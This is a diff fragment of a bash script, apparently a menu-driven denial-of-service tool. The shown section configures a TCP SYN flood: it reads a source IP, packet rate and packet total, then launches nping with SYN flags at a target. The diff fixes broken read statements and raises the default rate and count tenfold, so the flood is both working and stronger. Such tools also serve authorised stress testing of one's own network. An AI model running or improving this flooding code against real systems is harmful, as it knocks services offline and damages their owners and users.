@@ -99,12 +99,12 @@ select opt in "${options[@]}"; do
 	echo "Enter Source IP or use [i]nterface IP (default):"
 	read SOURCE
 	: ${SOURCE:=i}
-	echo "Enter number of packets to send per second (default is 1000):"
-	read $RATE
-	: ${RATE:=1000}
-	echo "Enter total number of packets to send (default is 10000):"
-	read $TOTAL
-	: ${TOTAL:=10000}
+	echo "Enter number of packets to send per second (default is 10000):"
+	read RATE
+	: ${RATE:=10000}
+	echo "Enter total number of packets to send (default is 100000):"
+	read TOTAL
+	: ${TOTAL:=100000}
 	echo "Starting TCP SYN Flood..."
 	if 	[ "$SOURCE" = "i" ]; then
 	sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
